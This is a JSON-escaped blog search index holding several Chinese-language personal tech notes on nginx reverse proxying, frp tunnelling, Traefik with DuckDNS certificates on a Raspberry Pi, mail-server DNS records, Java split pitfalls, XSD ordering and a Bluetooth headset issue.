    # 定義 header 變數, 記錄使用者的 IP\n        proxy_set_header X-Real-IP $remote_addr;\n        \n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n \n        proxy_set_header X-Forwarded-Proto $http_x_forwarded_proto;\n        proxy_max_temp_file_size 0;\n    }\n    location /web/ {\n       \n        # 後端的 Web Server, 即真實伺服器:\n        proxy_pass http://127.0.0.1:8080/;\n \n        # 定義 header 變數, 記錄使用者的 IP\n        proxy_set_header X-Real-IP $remote_addr;\n        \n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n \n        proxy_set_header X-Forwarded-Proto $http_x_forwarded_proto;\n        proxy_max_temp_file_size 0;\n    }\n}\n```\n\n參考:[Nginx代理proxy pass配置去除前缀 - Ryan.Miao - 博客园](https://www.cnblogs.com/woshimrf/p/nginx-proxy-rewrite-url.html)\n\n### 其他反向代理設定\n\nlocation 要包在 server 裡面\n\n/mockapi/ ==> 127.0.0.1:8081\n/web/ ==> 127.0.0.1:8080\n\n相對要連到\ntest.com/app/xxxxx =>  http://192.168.154.102/maped_dir/xxxxx\n\n```\nlocation /app/ {\n    proxy_pass      http://192.168.154.102/maped_dir/;\n}\n\n```\n\n非常簡單\n\ntest.com/app/8081 => http://192.168.154.102:8081\n\n```\nlocation ~ ^/app/(.*)$ {\n    proxy_pass       http://192.169.154.102:$1;\n}\n```\n\n\ntest.com/app/request/xxxxx => http://192.168.154.102:9999/some_dir/xxxxx\n\n```\nlocation ~ ^/app/(.*)$ {\n    proxy_pass       http://192.169.154.102:9999/some_dir/$1;\n}\n```\n\n/app/hit/some/request/?name=xxxxx\n\n=> http://192.168.154.102:9999/hit_page.php?path=some/request/&name=xxxxx\n\n```\nlocation  /app/ {\n    rewrite    ^/app/hit/(.*)$ /hit_page.php?path=$1 break;\n    proxy_pass   http://192.168.154.102:9999/some_dir/;\n}\n```\n\n參考[Nginx proxy_pass: examples for how does nginx proxy_pass map the request | Yet Another Summer Rain](https://www.liaohuqiu.net/posts/nginx-proxy-pass/)\n\n\n## frp\n\n之前有有紀錄 [frp 內網穿透使用筆記 | 程式狂想筆記](https://malagege.github.io/blog/2020/11/15/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/)\ncustom_domains、vhost_http_port 都需要設定\n\ncustom_domains 就設定 IP 就可以了\n參考:[七、利用frp 穿透到内网的http/https网站，实现对外开放 - 三度 - 博客园](https://www.cnblogs.com/sanduzxcvbnm/p/8509150.html)\n\n### frps\n\n```\n[common]\nbind_port = 7000\nvhost_http_port = 80\n```\n\n### frpc\n\n```ini frpc.ini\n[common]\nserver_addr = 127.0.0.1\nserver_port = 7000\n\n\n[web01]\ntype = http\nlocal_port = 8080\ncustom_domains = 127.0.0.1\nlocations = /web\n\n[web02]\ntype = http\nlocal_port = 8081\ncustom_domains = 127.0.0.1\nlocations = /mockapi\n```\n\n## 其他\n\ncaddy server\ntraefik 在想看看有空研究","tags":["proxy"],"categories":["Linux"]},{"title":"frp 內網穿透使用筆記","url":"%2Fblog%2F2020%2F11%2F15%2Ffrp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98%2F","content":"\n最近看 frp 文章\n我看反向代理不用設定在 server 那邊\n這邊方法有點跟 traefik 跟 label 實作有點像\n但網路上說這兩個用途有點不太一樣\n我認真看一下 frp 官網文件\n真的還是有差!!\n\n<!--more-->\n\nfrp 目前我看沒法跟 traefik 抓 docker label 去做自動代理動作\nfrp, traefik 都可以做 tcp, http 反向代理(聽說前幾版 traefik 不支援 tcp 代理)\n\n這邊來看，traefik 功能實用信應該大於 frp\n但看一下細節功能還是不一樣\n\nfrp 可以做 stcp(類似ssh tunnel) 連線，這邊 traefik 目前沒有這個東西\nxtcp, unix socket ...等等代理方法，這些 traefik 目前沒有這些\n\n## frp 環境建置\n\n這邊我就簡單用 Vagrant 建置幾個 VM 環境\n[檢查大量不同 IP 跟 Port 方法 | 程式狂想筆記](https://malagege.github.io/blog/2020/03/07/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/)\n這邊之前有寫過\n這邊從這邊簡單複製過來改\n\n```ruby\nVagrant.configure(\"2\") do |config|\n  config.vm.provision \"shell\", inline: \"echo Hello\"\n  \n  config.vm.define \"frp-server\" do |web|\n    web.vm.box = \"ubuntu/xenial64\"\n    web.vm.network \"private_network\", ip: \"192.168.50.2\"\n  end\n\n  config.vm.define \"frp-client1\" do |db|\n    db.vm.box = \"ubuntu/xenial64\"\n    db.vm.network \"private_network\", ip: \"192.168.50.4\"\n  end\n# 其實我發現可以不用開很多 VM\n# 可以用 tmux 多開 frpc ，假如要模擬測試多台連，可以用這個\n#   config.vm.define \"frp-client2\" do |db|\n#     db.vm.box = \"ubuntu/xenial64\"\n#     db.vm.network \"private_network\", ip: \"192.168.50.5\"\n#   end\n\n#   config.vm.define \"frp-client3\" do |db|\n#     db.vm.box = \"ubuntu/xenial64\"\n#     db.vm.network \"private_network\", ip: \"192.168.50.6\"\n#   end\n\n#   config.vm.define \"frp-client4\" do |db|\n#     db.vm.box = \"ubuntu/xenial64\"\n#     db.vm.network \"private_network\", ip: \"192.168.50.3\"\n#   end\nend\n\n```\n\nvagrant up 會等機器開好\n\n\n## frp 安裝教學\n\n參考:[安装 frp 内网穿透工具 | 离线笔记 · OfflineNotes](https://canwdev.github.io/manual/setup-frp.html)\n\n```sh\nwget https://github.com/fatedier/frp/releases/download/v0.34.2/frp_0.34.2_linux_amd64.tar.gz\ntar xzvf frp_0.34.2_linux_amd64.tar.gz\nmv frp_0.34.2_linux_amd64 frp\n```\n\n這段看要不要在本機做或在 VM 做都可以\nVM 記得要切到`/vagrant` 這邊做\n這樣其他機器就不用再抓一次了\n\n\n```ini\n[common]\nbind_port = 7000\n\ndashboard_addr = 0.0.0.0 # 正式不要開\ndashboard_port = 7500\n\n# 仪表盘访问的用户名密码，如果不设置，则默认都是 admin\ndashboard_user = admin\ndashboard_pwd = admin\n\n# auth token\ntoken = abcd1234567890\n```\n\n```bash\n# VM frp-server 可以使用 tmux \nvagrant ssh frp-server\ncd /vagrant/frp\n./frps -c frps.ini\n```\n\n\nhttp://192.168.50.2:7500 有看到畫面就是成功了\n\n\n## port 轉發\n\n### client 設定\n\n安裝 apache2 簡單做\n\n```sh\n# 進去client1 \nvagrant ssh frp-client1\n# 安裝 apache2\nsudo apt install apache2\ncurl localhost\n# 看到web內容就是完成了\n```\n\n```\ncp frpc.ini frpc1.ini\nvim frpc1.ini\n```\n\n```ini\n\n[common]\nserver_addr = 192.168.50.2\nserver_port = 7000\ntoken = abcd1234567890\n\n[web]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 80\nremote_port = 8080\n```\n\n這邊沒用type= http ，因為 http 需要加`custom_domains = 192.168.50.2`樣子\nhttp我好像會失敗，我先不用設定這麼麻煩\n可以看一下[利用FRP穿透到内网的http/https网站，实现对外开放 - 知乎](https://zhuanlan.zhihu.com/p/150650291)\nvhost_http_port也要設定\n我就懶得測試了\n\n## hfs\n\n之前進去 frpc 就懶得寫了\n\n```ini\n\n[common]\nserver_addr = 192.168.50.2\nserver_port = 7000\ntoken = abcd1234567890\n\n\n[test_static_file]\ntype = tcp\nremote_port = 8081\nplugin = static_file\n# 要对外暴露的文件目录\nplugin_local_path = /tmp\n# 用户访问 URL 中会被去除的前缀，保留的内容即为要访问的文件路径\nplugin_strip_prefix = static\nplugin_http_user = abc\nplugin_http_passwd = abc\n```\n\nhttp://192.168.50.2:8081/static/\n就可以進去了\n\n\n其實仔細想想好像不需要太多 frp-client\nfrpc可以同一台 server可以開很多...\n\n## 其他官網教學\n\n- [为本地 HTTP 服务启用 HTTPS | frp](https://gofrp.org/docs/examples/https2http/)\n- [安全地暴露内网服务 | frp](https://gofrp.org/docs/examples/stcp/)\n- [点对点内网穿透 | frp](https://gofrp.org/docs/examples/xtcp/)\n\n因為目前沒有要使用\n本來想要寫 stcp\n不過這個跟 ssh tunnel 差不多\n之前有記錄這篇[ssh port forward連MySQL方法(SSH Tunnel) | 程式狂想筆記](https://malagege.github.io/blog/2018/12/13/ssh-port-forward%E9%80%A3MySQL%E6%96%B9%E6%B3%95/)\n看上面教學還滿簡單了，這邊就不整理了\n\n## 相關文章\n- [MvsCode/frps-onekey: Frps 一键安装脚本&管理脚本 A tool to auto-compile & install frps on Linux](https://github.com/MvsCode/frps-onekey)\n- [免费frp公共服务器列表是什么？花生壳轻松实现ftp服务-oray贝锐科技花生壳官网](https://hsk.oray.com/news/8583.html)\n- [免费FRP内网穿透服务](https://freenat.ml/)\n- [\"远程办公\" 整体解决方案-内网穿透 - 知乎](https://zhuanlan.zhihu.com/p/150740136)","tags":["實用工具"],"categories":["ssh tunnel"]},{"title":"電腦使用藍芽耳機時候不能聽到電腦音樂(或其他聲音)","url":"%2Fblog%2F2020%2F11%2F12%2F%E9%9B%BB%E8%85%A6%E4%BD%BF%E7%94%A8%E8%97%8D%E8%8A%BD%E8%80%B3%E6%A9%9F%E6%99%82%E5%80%99%E4%B8%8D%E8%83%BD%E8%81%BD%E5%88%B0%E9%9B%BB%E8%85%A6%E9%9F%B3%E6%A8%82-%E6%88%96%E5%85%B6%E4%BB%96%E8%81%B2%E9%9F%B3%2F","content":"\n最近帶 SONY WH1000MX4 電腦聽音樂使用語音聊天\n發現聲音沒有聽到音樂，後來發現聲音有兩個裝置\n\n輸出\n\n1. WH-1000XM4 Stereo\n2. WH-1000XM4 Hands-Free AG Audio\n\n麥克風是\n\n1. WH-1000XM4 Hands-Free AG Audio\n\n<!--more-->\n\n簡單來說使用`WH-1000XM4 Stereo`不能使用麥克風....\n要全不聽到聲音跟別人聊天需要設定預設輸出`WH-1000XM4 Hands-Free AG Audio`\n但缺點音樂品質不是很好\n\n為什麼會這樣限制，好像跟藍芽傳輸頻寬有關係\n\n通常我們使用手機耳機聽音樂，有人打電話來，音樂會暫停\n但在 Windows 10 不會，不知道有什麼方法可以在 Window 10 切換?\n看到有「預設通訊裝置」，但預設不會切換；耶不會關掉音樂\n\n又看到官網介紹[WH-1000XM4 | 說明指南 | 在電腦上進行視訊通話](https://helpguide.sony.net/mdr/wh1000xm4/v1/zh-tw/contents/TP1000029161.html)\n\n網路上有用 powershell 指令切換 [win10连接蓝牙耳机不能语音，是否有解决办法？ - 知乎](https://www.zhihu.com/question/46880208)\n\n簡單來說只有這兩種選澤\n\n1. WH-1000XM4 Hands-Free AG Audio,WH-1000XM4 Hands-Free AG Audio\n2. WH-1000XM4 Stereo\n\n手動切換，好像無法自動切換麥克風(WH-1000XM4 Hands-Free AG Audio)","tags":["藍芽"],"categories":["電腦知識"]},{"title":"程式發信 mail 的問題整理","url":"%2Fblog%2F2020%2F10%2F28%2F%E7%A8%8B%E5%BC%8F%E7%99%BC%E4%BF%A1%E7%9A%84%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86%2F","content":"\n先蒐集，有空整理\n\n<!--more-->\n\n\n## 發信指令\n\n[16 Command Examples to Send Email From The Linux Command Line](https://blog.edmdesigner.com/send-email-from-linux-command-line/)\n\n\n## relay access denied\n\n[Postfix - Relay access denied - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/questions/10069903)\n\n[postfix relay access denied – 阿喵就像家](https://mlwmlw.org/2010/09/postfix-relay-access-denied/)\n\nMail Server 設定對應 IP 就可以發信出去了\n\n## 黑名單\n\n[DNSBL Information - Spam Database Lookup](https://www.dnsbl.info/dnsbl-database-check.php)\n\n[Blocklist Removal Center - The Spamhaus Project](https://www.spamhaus.org/lookup/)\n\n\n## 解決方案\n\n1. 更換 Mail Server 主機 IP (workaround?)\n2. DNS Server 設定MX\n3. 設定SPF\n4. 設定 DomainKey（DKIM）\n5. 設定 DMARC\n6. 開通25 Port\n\n\n## 建製 mail 注意的事情\n\n1. 整理發信來源IP\n2. 調整DNS，A、PTR、MX、TXT record、DKIM\n3. 向各Email服務商提出申請\n4. 發信機主機名稱\n5. LOG解析\n\n## 相關DNS Resource \n\n調整DNS\nA：正解\nPTR：反解\nMX：郵件交換紀錄\nTXT record：SPF\nDKIM\n\nMX：讓DNS能正常解析\nSPF：是一套電子郵件驗證機制，可指定哪些郵件伺服器有權為您的網域傳送電子郵件。\nDKIM：會為每一封郵件加上數位簽名，幫助收件伺服器確認郵件並非偽造，而且在傳輸過程中未遭到竄改。\n\n詳細: \n- [DNS資源紀錄(Resource Record)介紹](http://dns-learning.twnic.net.tw/bind/intro6.html)\n- [鳥哥的 Linux 私房菜 -- DNS Server](http://linux.vbird.org/linux_server/0350dns.php)\n\nnslookup\nA記錄(正解)\u000bset q=a\nptr記錄(反解)\u000bset q=ptr\nMX記錄(郵件交換記錄)\u000bset q=mx\nTXT記錄(文字記錄)\u000bset q=txt\n\n\n### nslookup \n\n[DNS傳播檢查 - Nslookup Tool](https://www.nslookuptool.com/cht/)\n\n## 相關名稱意思\n\n[ROKSO、SBL、XBL、PBL、DBL 是什么意思？ – 黄忠 – 博客](https://www.huangzhong.ca/zh/rokso-sbl-xbl-pbl-dbl/)","tags":["linux"],"categories":["Linux"]},{"title":"寫程式使用 split 切割不會注意到的陷阱","url":"%2Fblog%2F2020%2F10%2F28%2F%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1%2F","content":"\n最近 JAVA 程式遇到一個奇怪錯誤\n使用 split 針對 data 做分割\n切割符號為 ^\n最後發現是後面空白會合併空白\n\n<!--more-->\n\n\n```java\npublic class MyClass {\n    public static void main(String args[]) {\n        String str = new String(\"1^^2^^^3^4^5^^^^\");\n \n        System.out.println(\"^ 分隔符返回值 :\" );\n        int index = 0;\n        for (String retval: str.split(\"\\\\^\")){\n            System.out.println((index++) + \":\" + retval);\n        }\n \n    }\n}\n```\n\n得到結果會是\n\n```\n^ 分隔符返回值 :\n0:1\n1:\n2:2\n3:\n4:\n5:3\n6:4\n7:5\n```\n\n後面的^資料都是空白的話，都不會在陣列\n\n我一直以為別的程式語言也是這樣\n\n## JavaScript\n\n```javascript\n\"1^2^3^4^5^^^^\".split('^')\n// Array(9) [ \"1\", \"2\", \"3\", \"4\", \"5\", \"\", \"\", \"\", \"\" ]\n```\n\n等一下，Java 這邊好像是用 Regex\n馬上找一下方法嘗試\n\n```javascript\n\"1^2^3^4^5^^^^\".split(/\\^/)\n// Array(9) [ \"1\", \"2\", \"3\", \"4\", \"5\", \"\", \"\", \"\", \"\" ]\n```\n\n結果還是一樣\n\n## PHP\n\n\n```php\nvar_dump(explode(\"^\",\"1^2^3^4^5^^^^\"));\n```\n\n\n```php\nvar_dump( preg_split(\"/\\\\^/\", \"1^2^3^4^5^^^^\"));\n```\n\n都是\n\n```\narray(9) {\n  [0]=>\n  string(1) \"1\"\n  [1]=>\n  string(1) \"2\"\n  [2]=>\n  string(1) \"3\"\n  [3]=>\n  string(1) \"4\"\n  [4]=>\n  string(1) \"5\"\n  [5]=>\n  string(0) \"\"\n  [6]=>\n  string(0) \"\"\n  [7]=>\n  string(0) \"\"\n  [8]=>\n  string(0) \"\"\n}\n\n```\n\n## 結果\n\nJava 處理 Split 機制不太一樣\n這邊可以看看 split 可以帶第二個參數\n\n[String (Java Platform SE 7 )](https://docs.oracle.com/javase/7/docs/api/java/lang/String.html#split(java.lang.String,%20int))\n\n\n### String.split()與com.sun.deploy.util.StringUtils.split()的區別\n\n[String.split()与StringUtils.split()的区别_卡卡_西瓜的博客-CSDN博客](https://blog.csdn.net/csdm_admin/article/details/68483417)\n\n```java\nimport com.sun.deploy.util.StringUtils;\nString s =\",1,,2,3,4,,\";\nString[] split1 = s.split(\",\");\n// \nString[] split2 = StringUtils.splitString(s, \",\");\n// 1,2,3,4\n```\n\napache 結果會跟下面一樣\n\n\n#### 找到我們想要的\n\norg.apache.commons.lang3.StringUtils#splitPreserveAllTokens(str, separatorChar)\n[StringUtils (Apache Commons Lang 3.11 API)](http://commons.apache.org/proper/commons-lang/apidocs/org/apache/commons/lang3/StringUtils.html#splitPreserveAllTokens-java.lang.String-char-)\n\norg.apache.commons.lang3.StringUtils#splitByWholeSeparatorPreserveAllTokens(str, separator)\n\n歡呼!!\n[Java 有沒有像 Python 一樣的 split？ - \b摸鱼](https://www.mofish.work/thread/4471)\n看來還滿多人苦惱這個\n\n### 詳細解說\n\n有爬到這篇[Java 字符串 split 踩坑记](https://juejin.im/post/6844903966392713224)\n\n com.google.common.base.Splitter 這個比較是接近我們想要的\n\n ","tags":["split"],"categories":["Linux"]},{"title":"XSD 檢核遇到 tag 順序拿掉不能放 unbounded","url":"%2Fblog%2F2020%2F10%2F15%2FXSD-%E6%AA%A2%E6%A0%B8%E9%81%87%E5%88%B0-tag-%E9%A0%86%E5%BA%8F%E5%95%8F%E9%A1%8C%2F","content":"\n如題\nxs:sequence 會檢查 xml tag 順序\n[xml - how can i remove the ordering from a xsd sequence - Stack Overflow](https://stackoverflow.com/questions/23103526/how-can-i-remove-the-ordering-from-a-xsd-sequence)\n要排除這個方法要 xs:all\n但會遇到 unbounded 不能正常運作\n\n最後找到一篇解決方法\n\n<!--more-->\n\n[[XML] 讓 XML schema 允許 XML 中的元素多次出現、且順序不固定 | EPH 的程式日記](https://ephrain.net/xml-%E8%AE%93-xml-schema-%E5%85%81%E8%A8%B1-xml-%E4%B8%AD%E7%9A%84%E5%85%83%E7%B4%A0%E5%A4%9A%E6%AC%A1%E5%87%BA%E7%8F%BE%E3%80%81%E4%B8%94%E9%A0%86%E5%BA%8F%E4%B8%8D%E5%9B%BA%E5%AE%9A/)\n\n```xsd\n<xsd:element name=\"event\" minOccurs=\"1\" maxOccurs=\"unbounded\">\n  <xsd:complexType>\n    <xsd:sequence>\n      <xsd:choice minOccurs=\"1\" maxOccurs=\"unbounded\">\n        <xsd:element type=\"xsd:string\" name=\"keyword\"/>\n        <xsd:element type=\"xsd:string\" name=\"except\"/>\n      </xsd:choice>\n    </xsd:sequence>\n  </xsd:complexType>\n</xsd:element>\n```\n\n程式過了，太神啦!! 為什麼sequence 裡面可以放 choice ??\n先不管啦!! 又解決這一關\n\n奇怪的事情，開發環境竟然原本用 xsd:sequence 會過(Window)\n但在正式環境就不會...\n\n其他相關\n\n* [XSD 复合类型指示器](https://www.w3school.com.cn/schema/schema_complex_indicators.asp)\n* [XSD/XML Schema 学习笔记完整版 | C_Meng PSNA](https://imonce.github.io/2019/03/15/XSD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%AE%8C%E6%95%B4%E7%89%88/)\n* [xml - how can i remove the ordering from a xsd sequence - Stack Overflow](https://stackoverflow.com/questions/23103526/how-can-i-remove-the-ordering-from-a-xsd-sequence)\n* [[XML] 讓 XML schema 允許 XML 中的元素多次出現、且順序不固定 | EPH 的程式日記](https://ephrain.net/xml-%E8%AE%93-xml-schema-%E5%85%81%E8%A8%B1-xml-%E4%B8%AD%E7%9A%84%E5%85%83%E7%B4%A0%E5%A4%9A%E6%AC%A1%E5%87%BA%E7%8F%BE%E3%80%81%E4%B8%94%E9%A0%86%E5%BA%8F%E4%B8%8D%E5%9B%BA%E5%AE%9A/)","tags":["xsd"],"categories":["XML"]},{"title":"在 Raspberry PI 架設 Traefik 初體驗","url":"%2Fblog%2F2020%2F10%2F13%2F%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97%2F","content":"\n最近在樹梅派使用 Docker 服務多\n常常設完一個服務，我就要去Virtual Server 設定一個 port\n最後想到可以架一個 Server 做反向代理\n這時候我想到 nginx 和 caddy\ncaddy 又可以幫我換 letsencrypt 憑證\n最後看到這篇[用 Traefik 搭配 Docker 快速架設服務 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY](https://blog.wu-boy.com/2019/01/deploy-service-using-traefik-and-docker/)\n\n> 我要介紹另外一套工具叫 Traefik，這一套也是用 Go 語言開發，而我推薦這套的原因是，此套可以跟 Docker 很深度的結合，只要服務跑在 Docker 上面，Traefik 都可以自動偵測到，並且套用設定。透過底下的範例讓 Traefik 串接後端兩個服務，分別是 domain1.com 及 domain2.com。\n\n好像能試試看喔\n\n<!--more-->\n\n## 事前準備\n\n### docker-compose\n我發現我樹梅派沒安裝 docker-compose\n\n```bash\nsudo pip3 install docker-compose\n```\n\n安裝就這麼簡單\n\n### 修改舊的 dockerfile\n\n發現有人做過\n[Docker 与 Traefik 助微服务腾飞 - 后端](https://juejin.im/entry/6844903458986786830)\n不過版本是1.3.8\n現在出到 2 了\n想使用新版本\n看一下舊版的 dockerfile \n只是下載直接執行\n[rpi-traefik/Dockerfile at master · hypriot/rpi-traefik](https://github.com/hypriot/rpi-traefik/blob/master/Dockerfile)\n\n~~PS: Dockerfile ADD 可以放 http 以外，他可以放 gz 連結，會自動解壓縮~~\n[Dockerfile COPY 和 ADD 指令區別和使用規則 - Lishude's Web Note](https://islishude.github.io/blog/2019/06/29/docker/Dockerfile-COPY-%E5%92%8C-ADD-%E6%8C%87%E4%BB%A4%E5%8C%BA%E5%88%AB%E5%92%8C%E4%BD%BF%E7%94%A8%E8%A7%84%E5%88%99/)\n\n> 上面的命令會導致foo.tar.gz歸檔文件的內容被解壓到容器的/ tmp目錄中。 有趣的是，URL下載和解壓功能不能一起使用。任何通過URL複製的壓縮文件都不會自動解壓縮。\n[Dockerfile:ADD VS COPY](https://juejin.im/post/6844903574539862030)\n\n> ADD的另外一個特性是有能力自動解壓文件。如果<src>參數是一個可識別的壓縮格式（tar, gzip, bzip2, etc）的本地文件（所以實現不了同時下載並解壓），就會被解壓到指定容器文件系統的路徑<dest>。\nADD /foo.tar.gz /tmp/\n上述指令會使foo.tar.gz壓縮文件解壓到容器的/tmp目錄。\nURL下載和解壓特性不能一起使用。任何壓縮文件通過URL拷貝，都不會自動解壓。\n目前ADD指令有點讓人迷惑，有時候解壓文件，有時候不解壓文件，如果你想拷貝一個壓縮文件，你會以為地解壓。如果文件是某種不能識別的壓縮文件，如果你想解壓，你又會意外地複製它。\n[docker Dockerfile指令ADD和COPY的區別，添加目錄方法 - 大自然的流風 - 博客園](https://www.cnblogs.com/zdz8207/p/linux-docker-add-copy.html)\n\n\n```dockerfile\nFROM hypriot/rpi-alpine:3.6\nADD https://github.com/traefik/traefik/releases/download/v2.3.1/traefik_v2.3.1_linux_armv7.tar.gz /traefik.tar.gz\nRUN tar zxvf traefik.tar.gz\nRUN apk upgrade --no-cache &&\\\n    apk add --no-cache ca-certificates &&\\\n    chmod +x /traefik\nEXPOSE 80 8080 443\nENTRYPOINT [\"/traefik\"]\n```\n\n做到後面，我發現有現成的 Image \n[arm64v8/traefik - Docker Hub](https://hub.docker.com/r/arm64v8/traefik)\n\n## Raspberry PI 安裝 traefik\n\ndocker build . -t traefik\n\n### 建立 network\n\ndocker network create traefik_network\n\n\n### 建置 docker-compose\n\n```yml\nversion: '3'\n\nservices:\n  traefik:\n    image: traefik\n    command: --api.insecure=true --providers.docker\n    ports:\n      - \"80:80\"\n      - \"8080:8080\"\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    networks:\n      - traefik_network\nnetworks:\n  traefik_network:\n    external: true\n\n```\n\n### 建置 whoami\n\n```yml\nversion: \"2\"\n\nservices:\n  whoami:\n    image: hypriot/rpi-whoami\n    networks:\n        - traefik_network\n    environment:\n      - constraint:hypriot.hierarchy!=leader\n      - PORT=8000\n    labels:\n      - \"traefik.backend=whoami\"\n#      - \"traefik.frontend.rule=Host:whoami.docker.localhost\"\n#2.3.1 上面設定好像會無效\n      - \"traefik.http.routers.router0.rule=Host(`whoami.localhost`) || PathPrefix(`/whoami`)\"\n      - \"traefik.port=8000\"\n\nnetworks:\n  traefik_network:\n    external: true\n```\n\n## 測試方法\n\n### 方法1:修改hosts檔案\n\n/etc/hosts\n\n127.0.0.1    whoami.localhost\n\n### 方法2: curl -H xxx\n\ncurl -H Host:whoami.localhost http://192.168.1.1/\n\n[Docker 与 Traefik 助微服务腾飞 - 后端](https://juejin.im/entry/6844903458986786830)\n裡面適用這個方法\n\n推薦使用這個，這樣就不用做多餘的設定\n\n舊版本差異\n[Traefik v1 to v2 - Traefik](https://doc.traefik.io/traefik/migration/v1-to-v2/)\n\n\n\n[traefik 简易入门 | 个人服务器运维指南 | 山月行](https://shanyue.tech/op/traefik.html#%E5%BF%AB%E9%80%9F%E5%BC%80%E5%A7%8B)\n[arm32v6/traefik - Docker Hub](https://hub.docker.com/r/arm32v6/traefik/)\n[Traefik](https://doc.traefik.io/traefik/)\n[用 Traefik 搭配 Docker 快速架設服務 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY](https://blog.wu-boy.com/2019/01/deploy-service-using-traefik-and-docker/)\n[10 分鐘內用 Traefik 架設 Drone 搭配 GitHub 服務 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY](https://blog.wu-boy.com/2019/03/setup-traefik-with-drone-ci-cd-in-ten-minutes/)\n[个人网站实现方案更新：Traefik 反向代理、与 NAS 共用 Wildcard 证书等 – Blanboom](https://blanboom.org/2019/traefik-and-wildcard-cert-on-my-website/)\n\n\n\n> 當我們訪問集群內部服務，如數據庫，緩存，traefik Dashboard，gitlab 時，如果直接暴露在公網中，則會造成很大安全隱患，此時我們應該如何處理呢？\n\n[traefik 簡易入門 | 個人服務器運維指南 | 山月行](https://shanyue.tech/op/traefik.html#%E6%80%BB%E7%BB%93)\n\n[一文搞懂 Traefik2.1 的使用_River's Site - MdEditor](https://www.mdeditor.tw/pl/p8UD/zh-tw)\n[使用 Docker 和 Traefik 搭建 GitLab （前篇） - 知乎](https://zhuanlan.zhihu.com/p/61967315)\n[在Docker Swarm上部署Traefik2.x - 简书](https://www.jianshu.com/p/3ea76663243b)\n\n\n## traefik 綁定 lets wildcard\n\nwildcard 只能用 dns chang\n\n\n### 註銷舊有憑證方法\n\n沒用的跳過\ncertbot revoke --cert-path /etc/letsencrypt/archive/${YOUR_DOMAIN}/cert1.pem\n\n不過後來沒是成功\n我先把nextcloud 綁下來\n感覺不能直接這樣做??\n後來想說直接用新的 url\n\n### 設定\n\n#### acme.json\n\n```bash\n# 在docker-compose.yml 路徑\ntouch acme.json && chmod 600 acme.json\n```\n\n#### 設定 traefik docker-compose\n\n參考這個[traefik_duckdns/docker-compose.yml at master · KnicKnic/traefik_duckdns](https://github.com/KnicKnic/traefik_duckdns/blob/master/docker-compose.yml)\n\n對應我的 docker-compose 做修改\n\n```env .env\n#your duck dns token\nDUCKDNS_TOKEN=\n\n#your duck dns subdomain (not the full domain)\n#use \"test\" not \"test.duckdns.org\nDUCKDNS_SUBDOMAIN=\n\n```\n\n\n```yml\nversion: '3'\n\nservices:\n  updateDuckDNSIP:\n    # used to update duckdns\n    # if you have a static IP, yu can comment this out\n    # using busybox due to it having an image for almost every platform\n    image: armhf/ubuntu\n    command: /bin/sh -c \"apt update -y && apt install curl -y && while true; do echo url=\\\"https://www.duckdns.org/update?domains=${DUCKDNS_SUBDOMAIN}&token=${DUCKDNS_TOKEN}\\\" | curl -k -o duck.log -K -; sleep 300; done\"\n    restart: always\n    labels:\n      - \"traefik.enable=false\"\n  traefik:\n    image: traefik\n    command:\n      - \"--api.insecure=true\"\n      - \"--providers.docker\"\n      - \"--entrypoints.web.address=:80\"\n      - \"--entrypoints.web-secure.address=:443\"\n      - \"--certificatesresolvers.letsencrypt.acme.dnschallenge=true\"\n      - \"--certificatesresolvers.letsencrypt.acme.email=xxxxx@gmail.com\"\n      - \"--certificatesresolvers.letsencrypt.acme.storage=acme.json\"\n      - \"--certificatesresolvers.letsencrypt.acme.dnschallenge.provider=duckdns\"\n      - \"--certificatesresolvers.letsencrypt.acme.dnschallenge.delaybeforecheck=0\"\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n      - \"8080:8080\"\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n      - ./acme.json:/acme.json\n    networks:\n      - traefik_network\n    environment:\n      - DUCKDNS_TOKEN=${DUCKDNS_TOKEN}\n    labels:\n      - \"traefik.enable=false\"\n      - \"traefik.http.routers.traefik.tls=true\"\n      - \"traefik.http.routers.traefik.tls.certresolver=letsencrypt\"\n      - \"traefik.http.routers.traefik.tls.domains[0].main=${DUCKDNS_SUBDOMAIN}.duckdns.org\"\n      - \"traefik.http.routers.traefik.tls.domains[0].sans=*.${DUCKDNS_SUBDOMAIN}.duckdns.org,${DUCKDNS_SUBDOMAIN}.duckdns.org\"\nnetworks:\n  traefik_network:\n    external: true\n```\n\n這邊有個小技巧，使用搭配 .env\n可以用 docker-compose config 看看有沒有設定到\n\ncertresolver 的 letsencrypt 是看自己命名的名子certificatesresolvers.`letsencrypt`.acme.dnschallenge\n\nwhoami\n\n```bash\nversion: \"2\"\n\nservices:\n  whoami:\n    image: hypriot/rpi-whoami\n    networks:\n        - traefik_network\n    environment:\n      - constraint:hypriot.hierarchy!=leader\n      - PORT=8000\n    labels:\n      - \"traefik.backend=whoami\"\n      - \"traefik.http.routers.whoami.rule=Host(`whoami.xxxxx`) || PathPrefix(`/whoami`)\"\n      - \"traefik.http.routers.whoami.tls=true\"\n      - \"traefik.http.services.whoami.loadbalancer.server.port=8000\"\n\nnetworks:\n  traefik_network:\n    external: true\n```\n\n### 問題整理\n\n####  port is missing\n\ntraefik_1          | 